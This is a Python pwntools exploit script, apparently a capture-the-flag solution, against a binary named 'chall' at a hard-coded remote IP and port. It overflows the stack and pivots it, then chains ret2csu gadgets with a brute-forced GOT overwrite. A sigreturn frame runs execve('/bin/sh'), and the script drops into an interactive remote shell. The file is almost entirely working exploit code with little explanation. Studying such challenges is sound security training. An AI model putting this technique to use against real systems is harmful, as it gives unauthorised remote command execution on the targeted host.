#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 60901 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.172'
port = int(args.PORT or 60901)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x401136
b *0x401169
b *0x4011b9
continue
c
c
# c
# c
# c
# c
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

leave = 0x401168
main = 0x40113a

pop_csu = 0x4011ca
call_csu = 0x4011b0

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0, pop=True):
    p_csu = ''
    if pop == True:
        p_csu += p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(edi) # r12
        p_csu += p64(rsi) # r13
        p_csu += p64(rdx) # r14
        p_csu += p64(call_func) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

pop_rsi = 0x00000000004011d1
pop_rdi = 0x00000000004011d3
add_dword = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
pop_rsp = 0x4011cd # rsp,r13,r14,r15,ret
push = 0x401182
pop_rbp =0x000000000040111d

read_got = exe.got['read']
read_plt = exe.plt['read']
print hex(read_plt)

def exploit(brute):
    p = "A" * (0x200)
    p += p64(exe.bss(0xa00))
    p += p64(0x401145)

    io.send(p.ljust(0x210, b"X"))

    # p = ret2csu(read_got, 0, 0x0000000000404d00, 15, rbp_a = 0x404018+0x3d,rbx_a=12)
    p = ret2csu(read_got, 0, 0x0000000000404d00, 15, rbp_a = 0x404018+0x3d,rbx_a=brute)
    p += p64(add_dword)
    p += p64(read_plt) # 0x401040
    frame = SigreturnFrame()
    frame.rax = 0x3b # 59 excerve
    frame.rdi = 0x0000000000404d00 # bss -> "/bin/sh\x00"
    frame.rsi = 0 # harus 0
    frame.rdx = 0 # harus 0
    frame.rsp = 0x0000000000404d00
    frame.rip = read_plt # jump -> syscall
    p += str(frame)
    # print(len(p))
    assert p > 0x200

    p = p.ljust(0x200, b"\x00")
    p += p64(exe.bss(0xa00)-0x208)
    p += p64(leave)
    sleep(0.5)
    io.send(p)

    sleep(0.5)
    p ='/bin/sh\x00'
    io.send(p.ljust(15,"\x00"))


for i in range(16,255):
    try:
        io = start()
        exploit(i)
        print (i)
        io.sendline("echo AAAA") # 40
        if "AAAA" in io.recv():
            print "found"
            io.interactive()
            break
    except:
        io.close()
